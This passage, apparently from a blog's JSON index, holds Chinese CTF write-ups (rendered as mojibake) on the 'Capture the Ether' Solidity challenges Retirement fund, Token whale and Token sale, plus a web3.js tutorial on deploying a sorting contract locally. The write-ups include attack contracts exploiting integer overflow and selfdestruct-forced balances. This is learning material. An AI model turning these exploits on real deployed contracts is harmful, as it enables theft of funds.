selfdestructå‘½ä»¤ï¼Œå°†æŸä¸ªåˆçº¦çš„é’±å¼ºè¡Œè½¬ç»™æŒ‡å®šåˆçº¦ 2.4 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œå¾€åˆçº¦ä¸­å‘é€ä¸€ç‚¹ä¸»å¸ï¼Œå†æ‰§è¡Œè‡ªæ¯å‘½ä»¤ æ”»å‡»åˆçº¦ï¼š 12345678contract Hack &#123; function Hack(address _address) public payable &#123; // RetirementFundChallenge retiement = RetirementFundChallenge(_address); selfdestruct(_address); &#125;&#125; 3.è§£é¢˜ 3.1 éƒ¨ç½² RetirementFundChallengeåˆçº¦ ![image-20240412145318323](Retirement fund&#x2F;image-20240412145318323.png) 3.2 éƒ¨ç½² Hack åˆçº¦ï¼Œç»™ RetirementFundChallengeåˆçº¦ è½¬å…¥ 1 ether ![image-20240412145338663](Retirement fund&#x2F;image-20240412145338663.png) 3.3 è°ƒç”¨ collecPenaltå‡½æ•° ![image-20240412145351671](Retirement fund&#x2F;image-20240412145351671.png) æŸ¥çœ‹isCompleteçš„å€¼å˜æˆäº† true ![image-20240412145405659](Retirement fund&#x2F;image-20240412145405659.png) ä¸€æ®µæ—¶é—´ä¹‹åçš„äºŒåˆ· æ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526/** æ”»å‡»æ€è·¯ï¼š 1. å…ˆé€šè¿‡Helperå¼ºåˆ¶ç»™challengeåˆçº¦èµšé’±ï¼Œä½¿å¾— uint256 withdrawn = startBalance - address(this).balance; æº¢å‡º 2. é€šè¿‡hackerè°ƒç”¨attackå‡½æ•°ï¼Œå®Œæˆæ”»å‡» 3. éƒ¨ç½²é¡ºåºï¼šHack =ã€‹ challenge =ã€‹ Helper*/contract Hack &#123; function attack(RetirementFundChallenge challenge) public &#123; challenge.collectPenalty(); require(challenge.isComplete()); tx.origin.transfer(address(this).balance); &#125; function() external payable &#123;&#125;&#125;contract Helper &#123; function Helper() public payable &#123;&#125; function selfdestruct_(address challenge) public payable &#123; selfdestruct(challenge); &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Token whale","slug":"CTFS/capther the ether/Token whale","date":"2023-04-13T06:01:10.000Z","updated":"2023-04-13T06:01:10.000Z","comments":true,"path":"2023/04/13/CTFS/capther the ether/Token whale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/CTFS/capther%20the%20ether/Token%20whale/","excerpt":"","text":"Token whale1. é¢˜ç›® 1.1 è¦æ±‚ï¼š This ERC20-compatible token is hard to acquire. Thereâ€™s a fixed supply of 1,000 tokens, all of which are yours to start with. Find a way to accumulate at least 1,000,000 tokens to solve this challenge 1.2 æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; totalSupply = 1000; balanceOf[player] = 1000; &#125; function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; event Transfer(address indexed from, address indexed to, uint256 value); function _transfer(address to, uint256 value) internal &#123; balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; function transfer(address to, uint256 value) public &#123; require(balanceOf[msg.sender] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; require(balanceOf[from] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; _transfer(to, value); &#125;&#125; 2. åˆ†æ 2.1 é¦–å…ˆå¯¹ä»£ç è¿›è¡Œè§£è¯»ï¼Œæ…¢æ…¢çœ‹æ‡‚ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; // å‘è¡Œé‡æ˜¯ 1000 totalSupply = 1000; // åˆå§‹åŒ–ç©å®¶çš„ä»£å¸ä¸º 1000 balanceOf[player] = 1000; &#125; // é€šå…³è¦æ±‚ï¼šéœ€è¦ç©å®¶çš„ä»£å¸ &gt;= 1000000 function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; // è§¦å‘äº‹ä»¶ è°å‘è°è½¬äº†å¤šå°‘ value event Transfer(address indexed from, address indexed to, uint256 value); //å†…éƒ¨çš„ å‘é€å‡½æ•° -- å°†åˆçº¦è°ƒç”¨è€…çš„ä»£å¸è½¬ç§»ç»™ æ¥æ”¶æ–¹to function _transfer(address to, uint256 value) internal &#123; // è¿™é‡Œå‡çš„æ˜¯ åˆçº¦è°ƒç”¨è€…çš„ä»£å¸ // åªè¦è¿™é‡Œçš„msg.sender ä¸æ˜¯ åŒä¸€ä¸ªåœ°å€ï¼Œé‚£ä¹ˆé¢„é˜²ä¸äº†æº¢å‡ºè¿™ä¸ªæ¼æ´ balanceOf[msg.sender] -= value; // è¿™é‡Œè¦æ³¨æ„ balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; // å¤–éƒ¨çš„äº¤æ˜“å‡½æ•°ï¼Œå°†è°ƒç”¨è€…çš„ä»£å¸å‘é€ç»™æ¥æ”¶è€…to function transfer(address to, uint256 value) public &#123; // ç¡®ä¿è°ƒç”¨è€…çš„é’±è¶³å¤Ÿå‘é€ require(balanceOf[msg.sender] &gt;= value); // è¿™ä¸ªæ˜¯ï¼Ÿï¼Ÿï¼Ÿï¼Ÿä¸ºäº†é˜²æ­¢ä¸Šæº¢ï¼Ÿï¼Ÿï¼Ÿ require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); // æˆæƒé¢åº¦ function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; // æ£€æŸ¥çš„æ˜¯ from è¿™ä¸ªåœ°å€çš„ä»£å¸ // å®‰å…¨éšæ‚£ï¼šç›¸å½“äº å°ç‹å’Œå°æï¼Œåªè¦å°ç‹æœ‰é’±æˆ‘å°±å¯ä»¥ä¸€ç›´ä»å°æé‚£é‡Œå–é’± require(balanceOf[from] &gt;= value); // è¿™ä¸ªæ ¡éªŒå¾ˆå®¹æ˜“é€šè¿‡ï¼Œæˆ‘æ„Ÿè§‰æ˜¯åªè¦ä¸å¼„æº¢å‡ºå°±æ²¡äº‹ require(balanceOf[to] + value &gt;= balanceOf[to]); // è°ƒç”¨ approveå‡½æ•°ï¼Œè®© from ç»™åˆçº¦è°ƒç”¨è€…æˆæƒ require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; // è®©to å’Œ msg.senderä¸ä¸€è‡´ï¼Œç ´è§£å®ƒé‚£ç®€ç®€å•å•çš„ä¿æŠ¤æªæ–½ï¼Œtoå¯ä»¥éšä¾¿ä¹±å¡«ä¸€ä¸ªåœ°å€ _transfer(to, value); &#125;&#125; 2.2 æœ¬é¢˜çš„ç›®æ ‡å°±æ˜¯ balanceOf[player] &gt;= 1000000 è€Œåˆçº¦ä¸­çš„ä»£å¸å‘è¡Œé‡åªæœ‰ 1000 é‚£ä¹ˆå¤šï¼Œæ˜¾ç„¶åªé€šè¿‡ç®€å•çš„è½¬è´¦æ“ä½œæ˜¯ä¸å¯èƒ½å®ç°çš„ï¼Œæ‰€ä»¥ï¼Œåªèƒ½å¾€æº¢å‡ºçš„æ–¹å‘å»æ€è€ƒ 2.3 è€Œåˆçº¦ä¸­èƒ½äº§ç”Ÿæº¢å‡ºçš„ä¸”æ¶‰åŠåˆ° balanceOf çš„åªæœ‰ _transfer å‡½æ•°ä¸­çš„ balanceOf[msg.sender] -= value; è¿™ä¸ªå¯ä»¥äº§ç”Ÿæº¢å‡ºï¼Œç”Ÿæˆå¾ˆå¤šå¾ˆå¤šä»£å¸ã€‚ 2.4 åˆçº¦ä¸­è°ƒç”¨æ­¤å†…éƒ¨å‡½æ•°çš„æ–¹æ³•åªæœ‰ transfer å’Œ transferFrom ã€‚ç»†çœ‹å¯çŸ¥ transfer å‡½æ•°ä¸­ æœ‰require(balanceOf[msg.sender] &gt;= value)æ£€éªŒï¼Œè¿™ä¸ªæ£€éªŒè®©è¿™ä¸ªå‡½æ•°å˜å¾—å®‰å…¨ï¼Œå› ä¸ºå®ƒå’Œ _transferå‡½æ•°ä¸­çš„balanceOf[msg.sender] -= value;çš„msg.sender ä¿æŒä¸€è‡´ï¼Œæ— æ³•è¿›è¡Œæº¢å‡ºæ“ä½œ 2.5 transferFrom åˆçº¦ä¸­æœ‰ä¸‰ä¸ªæ ¡éªŒ 12345678910// æ£€æŸ¥çš„æ˜¯ from è¿™ä¸ªåœ°å€çš„ä»£å¸ // å®‰å…¨éšæ‚£ï¼šç›¸å½“äº å°ç‹å’Œå°æï¼Œåªè¦å°ç‹æœ‰é’±æˆ‘å°±å¯ä»¥ä¸€ç›´ä»å°æé‚£é‡Œå–é’± require(balanceOf[from] &gt;= value); // è¿™ä¸ªæ ¡éªŒå¾ˆå®¹æ˜“é€šè¿‡ï¼Œæˆ‘æ„Ÿè§‰æ˜¯åªè¦ä¸å¼„æº¢å‡ºå°±æ²¡äº‹ require(balanceOf[to] + value &gt;= balanceOf[to]); // è°ƒç”¨ approveå‡½æ•°ï¼Œè®© from ç»™åˆçº¦è°ƒç”¨è€…æˆæƒ require(allowance[from][msg.sender] &gt;= value); 2.6 æˆ‘ä»¬å¯çŸ¥ï¼Œå®ƒæ ¡éªŒçš„æ˜¯from åœ°å€ ï¼Œä½†æ˜¯ _transfer åˆçº¦ä¸­æ“ä½œçš„æ˜¯ msg.sender è¿™å°±æœ‰äº†æ“ä½œç©ºé—´ï¼Œåªè¦åˆ«äººæœ‰é’±æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ ¡éªŒæ‰§è¡Œä»¥ä¸‹çš„ä¸€ç³»åˆ—æ“ä½œ å€¼å¾—æ³¨æ„çš„æ˜¯æ–¹æ³•çš„å½¢å‚çš„ to ä¸èƒ½å’Œå½“å‰çš„åˆçº¦è°ƒç”¨è€…ä¸€è‡´ï¼Œå¦åˆ™ä»–ä¼šè¢«_transferå‡½æ•°ä¸­çš„å°å°ä¿æŠ¤æœºåˆ¶ç»™è¿˜åŸå›å»çš„ï¼Œæˆ‘ä¹‹å‰å°±è¯•è¿‡ 3. è§£é¢˜ 3.1 ç»™å‡½æ•°å¡«å…¥å‚æ•° ![image-20240412145551536](Token whale&#x2F;image-20240412145551536.png) 3.2 é¦–å…ˆè¦é€šè¿‡ç¬¬ä¸€ä¸ªæ ¡éªŒï¼šå¯ä»¥ç”¨ç©å®¶åœ°å€ï¼ˆbalanceOf[play] &#x3D; 1000ï¼‰ä½œä¸º from ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ç¬¬ä¸€ä¸ªæ ¡éªŒäº† ![image-20240412145558250](Token whale&#x2F;image-20240412145558250.png) 3.3 to éšä¾¿å¡«ä¸€ä¸ªåœ°å€å°±å¯ä»¥ï¼Œåªè¦ä¸å’Œmsg.sender æ˜¯åŒä¸€ä¸ªåœ°å€å°±è¡Œ 3.4 è¦é€šè¿‡ç¬¬äºŒä¸ªæ ¡éªŒï¼Œå°±éœ€è¦ allowance[from][msg.sender] &gt;= value ï¼Œæ‰€ä»¥éœ€è¦å…ˆè°ƒç”¨approve å‡½æ•°ï¼Œå°†è°ƒç”¨è€…åœ°å€åˆçº¦åˆ‡å› ç©å®¶åœ°å€ï¼Œspenderå°±æ˜¯ ä½ ç­‰ä¸‹è¦ä½¿ç”¨çš„msg.senderï¼Œç„¶åéšä¾¿æˆæƒï¼Œæˆ‘è¿™é‡Œæˆæƒä¸€å—é’±ï¼Œå› ä¸ºä¸€ä¸ªå¾ˆç®€å•æº¢å‡ºå°±æ˜¯ 0 - 1 ![image-20240412145606809](Token whale&#x2F;image-20240412145606809.png) 3.5 è°ƒç”¨ä¹‹åï¼ŒæŸ¥çœ‹ balanceOf[msg.sender] ![image-20240412145617600](Token whale&#x2F;image-20240412145617600.png) 3.6 å†è°ƒç”¨ transfer å‡½æ•°ï¼Œä» msg.sender è½¬ é’± ç»™ ç©å®¶ player ![image-20240412145626133](Token whale&#x2F;image-20240412145626133.png) é€šè¿‡ï¼ï¼ï¼ ![image-20240412145637909](Token whale&#x2F;image-20240412145637909.png) ä¸€æ®µæ—¶é—´ä¹‹åçš„äºŒåˆ· æ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829/** æ”»å‡»æ€è·¯: 1. éƒ¨ç½²Playerï¼Œéƒ¨ç½²challengeï¼Œéƒ¨ç½²Hack 2. è°ƒç”¨ player çš„attackï¼Œç»™hackeræˆæƒ 3. è°ƒç”¨Hackçš„attackï¼Œå®Œæˆæ”»å‡»*/contract Player &#123; function attack(address spender, uint256 value, TokenWhaleChallenge challenge) public &#123; challenge.approve(spender, value); &#125;&#125;contract Hack &#123; TokenWhaleChallenge challenge; function Hack(address _challenge) public &#123; challenge = TokenWhaleChallenge(_challenge); &#125; function attack(address player) public &#123; challenge.transferFrom(player, player, 1000); challenge.transfer(player, 1000000); require(challenge.isComplete()); &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Token sale","slug":"CTFS/capther the ether/Token sale","date":"2023-04-12T06:01:10.000Z","updated":"2023-04-12T06:01:10.000Z","comments":true,"path":"2023/04/12/CTFS/capther the ether/Token sale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/CTFS/capther%20the%20ether/Token%20sale/","excerpt":"","text":"Token sale1. é¢˜ç›® 1.1 This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether. The contract starts off with a balance of 1 ether. See if you can take some of that away. 1.2 æºç ï¼š 123456789101112131415161718192021222324252627pragma solidity ^0.4.21;contract TokenSaleChallenge &#123; mapping(address =&gt; uint256) public balanceOf; uint256 constant PRICE_PER_TOKEN = 1 ether; function TokenSaleChallenge(address _player) public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance &lt; 1 ether; &#125; function buy(uint256 numTokens) public payable &#123; require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; &#125; function sell(uint256 numTokens) public &#123; require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; msg.sender.transfer(numTokens * PRICE_PER_TOKEN); &#125;&#125; 2. åˆ†æ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼Œå¦‚æœæŒ‰éƒ¨å°±ç­æ¥æ“ä½œï¼ˆå³ ç”¨ç›¸åŒçš„é’±æ¥ä¹°ç›¸åŒçš„ä»£å¸æ˜¯è¡Œä¸é€šçš„â€”-å› ä¸º buy å‡½æ•°ä¸­çš„require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; å’Œ sell å‡½æ•°ä¸­çš„ require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; é™åˆ¶äº†ä½ å­˜å¤šå°‘å–å¤šå°‘ï¼Œä¸èƒ½å­˜å°‘å–å¤šï¼‰ 2.2 æ‰€ä»¥æŒ‰éƒ¨å°±ç­è¡Œä¸é€šï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½å¾€å­˜å°‘å–çš„æ–¹å‘å–è€ƒè™‘ï¼Œè¿™å°±æ¶‰åŠäº†æº¢å‡ºçš„é—®é¢˜ 2.3 ä»¥ uint8ä¸ºä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ åœ¨uint8 çš„åŠ æ³•ä¸­ 123&gt;254 + 1 = 255&gt;254 + 2 = 0&gt;254 + 3 = 1 æˆ‘åœ¨remixä¸­å°è¯•è¿‡ï¼Œç›´æ¥æ˜¾ç¤ºçš„å†™ uint8 = 255 + 1 æ˜¯ä¼šè¢«ç¼–è¯‘å™¨æ£€æµ‹å‡ºæ¥çš„ï¼Œä½†æ˜¯éšå¼çš„å†™åˆ™ä¸ä¼šå³ 12&gt;uint8 a = 255;&gt;uint8 b = a + 1; è¿™æ ·è¾“å‡ºçš„ç»“æœæ˜¯ 0ï¼› åœ¨uint8 çš„ä¹˜æ³•ä¸­ 12&gt;51 * 5 = 255&gt;51 * 6 = 50 51 * 6 = 50 å¯ä»¥æ ¹æ®åŠ æ³•æ‹†åˆ†ä¸º 51 * 6 = 51 * (5 + 1) = 51 * 5 + 51 = 255 + 1 + 50 = 50 æˆ‘çš„ç†è§£æ˜¯è¶…è¿‡ 255é‡æ–°è®¡æ•°ï¼Œå› ä¸ºuint8 çš„å–å€¼èŒƒå›´æ˜¯ [0,255] 256 ä½ï¼Œæ‰€ä»¥è¶…è¿‡255 çš„éƒ¨åˆ†åˆä» 0 å¼€å§‹ã€‚ åŒç† uint256 ç±»å‹ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œuint256çš„å–å€¼èŒƒå›´æ˜¯[0,115792089237316195423570985008687907853269984665640564039457584007913129639935] 2.4 æˆ‘ä»¬æœ¬ç€å­˜å°‘å–å¤šçš„åŸåˆ™ï¼Œè®© require(msg.value == numTokens * PRICE_PER_TOKEN); ä¸­çš„ numTokens * PRICE_PER_TOKEN å‘ç”Ÿæº¢å‡ºï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°èŠ±è´¹å°‘çš„ä¸»å¸è·å–æ›´å¤šçš„ä»£å¸ 2.5 åœ¨åˆçº¦ä¸­ä¸»å¸æ˜¯ä»¥ weiä¸ºå•ä½çš„ ä¹Ÿå°±æ˜¯è¯´ uint256 constant PRICE_PER_TOKEN = 1 ether = 10^18 wei æˆ‘ä»¬å°±éœ€è¦è®¡ç®—å‡ºæº¢å‡ºçš„é—¨æ§›æ˜¯å¤šå°‘ ï¼Œè®¡ç®—å¦‚ä¸‹ï¼š 1234567//115792089237316195423570985008687907853269984665640564039457584007913129639935uint256 result = 2**256 - 1;//115792089237316195423570985008687907853269984665640564039457uint256 temp = result / 10**18;// æ­¤æ—¶ç»™temp çš„å€¼åŠ  1 åº”è¯¥æ˜¯è§¦å‘æº¢å‡ºçš„æœ€ä½é—¨æ§›uint256 money = (temp + 1) * 10**18; //money=415992086870360064 åœ¨remixä¸Šæµ‹è¯•å¾—ï¼š ![image-20240412145505381](Token sale&#x2F;image-20240412145505381.png) 2.6 ç„¶åå†è°ƒç”¨buyå‡½æ•°çš„æ—¶å€™ï¼Œä»¥ temp+1çš„å€¼ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œmoneyçš„å€¼ä½œä¸ºmsg.value ![image-20240412145523203](Token sale&#x2F;image-20240412145523203.png) 2.7 ä»¥ 1 ä¸ºå‚æ•°è°ƒç”¨ sellå‡½æ•° ![image-20240412145532498](Token sale&#x2F;image-20240412145532498.png) è§£é¢˜æˆåŠŸ 3. è§£é¢˜è§£é¢˜è¿‡ç¨‹å¦‚ä¸Šè¿°åˆ†æ ä¸€æ®µæ—¶é—´æ—¶å€™ï¼ŒäºŒåˆ· æ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526contract Hack &#123; TokenSaleChallenge challenge; function Hack(address _challenge) public payable &#123; challenge = TokenSaleChallenge(_challenge); &#125; function figure() internal pure returns (uint256) &#123; return (getMax() / 1 ether + 1) * 1 ether; &#125; function getMax() internal pure returns (uint256) &#123; uint256 zero = 0; return zero - 1; &#125; function attack() public &#123; challenge.buy.value(figure())(getMax() / 1 ether + 1); challenge.sell(1); require(challenge.isComplete()); msg.sender.transfer(address(this).balance); &#125; function() external payable&#123;&#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"web3 å­¦ä¹ æ€»ç»“","slug":"Utils/Web3/web3 å­¦ä¹ æ€»ç»“","date":"2023-04-12T02:47:10.000Z","updated":"2023-04-12T02:47:10.000Z","comments":true,"path":"2023/04/12/Utils/Web3/web3 å­¦ä¹ æ€»ç»“/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Utils/Web3/web3%20%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"web3 å­¦ä¹ æ€»ç»“1. åˆçº¦çš„éƒ¨ç½² â€“ éœ€è¦å‘é€ä¸»å¸ï¼Œä»¥åŠä¼ å…¥å‚æ•°ä»¥ä¸€ä¸ªå†’æ³¡æ’åºåˆçº¦ä¸ºä¾‹ åˆçº¦ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract sort &#123; uint[] arr; constructor(uint[] memory arrays) payable &#123; require(msg.value == 1); arr = arrays; &#125; function bubSort() external returns(uint[] memory) &#123; bool flag; uint temp; for (uint i = 0; i &lt; arr.length - 1; i++) &#123; flag = true; for (uint j = 0; j &lt; arr.length - i - 1; j++) &#123; if(arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125;&#125; 1.1 åœ¨ remix ä¸­å¤åˆ¶åˆçº¦çš„ ABI å’Œ byteCode 1.2 åœ¨ vscode ä¸Šç¼–å†™ä»£ç ï¼Œåˆ›å»º sort.abi å’Œ sort.js æ–‡ä»¶ 1.3 åœ¨ æ ¹æ® è·å–çš„äº¤æ˜“å“ˆå¸Œï¼Œåœ¨ ganache ä¸Šæ‰¾åˆ°ç›¸åº”çš„åˆçº¦åœ°å€ 1.4 åœ¨remix ä¸ŠéªŒè¯éƒ¨ç½²å‡ºæ¥çš„åˆçº¦åœ°å€æ˜¯å¦çœŸå®ï¼Œåˆçº¦ä¸­æ˜¯æœ‰ä¸»å¸çš„ï¼Œæ‰€ä»¥æ˜¯æ­£ç¡®çš„ éƒ¨ç½²åˆçº¦çš„ä»£ç ï¼š 12345678910111213141516171819202122let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);var byteCode = &quot;0x60806040526040516106f33803806106f38339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b61043f806102b46000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063283fdc7814610030575b600080fd5b61003861004e565b60405161004591906102d9565b60405180910390f35b606060008060005b6001600080549050610068919061032a565b8110156101b8576001925060005b600182600080549050610089919061032a565b610093919061032a565b81101561019f5760006001826100a9919061035e565b815481106100ba576100b9610392565b5b9060005260206000200154600082815481106100d9576100d8610392565b5b9060005260206000200154111561018c57600081815481106100fe576100fd610392565b5b90600052602060002001549250600060018261011a919061035e565b8154811061012b5761012a610392565b5b90600052602060002001546000828154811061014a57610149610392565b5b9060005260206000200181905550826000600183610168919061035e565b8154811061017957610178610392565b5b9060005260206000200181905550600093505b8080610197906103c1565b915050610076565b50826101b85780806101b0906103c1565b915050610056565b50600080548060200260200160405190810160405280929190818152602001828054801561020557602002820191906000526020600020905b8154815260200190600101908083116101f1575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b6102508161023d565b82525050565b60006102628383610247565b60208301905092915050565b6000602082019050919050565b600061028682610211565b610290818561021c565b935061029b8361022d565b8060005b838110156102cc5781516102b38882610256565b97506102be8361026e565b92505060018101905061029f565b5085935050505092915050565b600060208201905081810360008301526102f3818461027b565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006103358261023d565b91506103408361023d565b9250828203905081811115610358576103576102fb565b5b92915050565b60006103698261023d565b91506103748361023d565b925082820190508082111561038c5761038b6102fb565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103cc8261023d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103fe576103fd6102fb565b5b60018201905091905056fea264697066735822122040692a2976cbd61653fb0d4195fa70c62b232f3d9b74fdf1f80f9e5bbada103c64736f6c63430008130033&quot;;// éƒ¨ç½²åˆçº¦çš„ä»£ç contract.deploy(&#123; data: byteCode, arguments: [[5,4,3,2,1]]&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 4700000, value: 1&#125;,function(err,result)&#123; console.log(&quot;åˆçº¦éƒ¨ç½²å¾—åˆ°çš„äº¤æ˜“å“ˆå¸Œä¸ºï¼š&quot;); console.log(result);&#125;) 2.1 è°ƒç”¨åˆçº¦çš„å‡½æ•°ï¼Œpayableå‡½æ•° 2.1 è°ƒç”¨ bubSortå‡½æ•°ï¼Œå¯¹æ•°ç»„è¿›è¡Œæ’åº 123456789101112// è°ƒç”¨åˆçº¦å‡½æ•°var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;) æ‰§è¡Œç»“æœï¼š 2.2 æ‰§è¡Œä¹‹åè·å¾—äº¤æ˜“çš„å“ˆå¸Œï¼Œå¹¶åœ¨ganacheä¸ŠæŸ¥çœ‹ 2.3 å°†äº¤æ˜“å“ˆå¸Œé€šè¿‡ remix ä¸Šçš„debug æ¥æŸ¥çœ‹åˆçº¦ä¸­çš„å˜é‡ æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä¼ å…¥çš„æ•°ç»„ä¸º[5,4,3,2,1] è°ƒç”¨æ’åºå‡½æ•°ä¹‹åï¼Œæ•°ç»„å˜æˆäº†[1,2,3,4,5] è¯´æ˜æ‰§è¡ŒæˆåŠŸ 2.4 å®Œæ•´çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);// var byteCode = 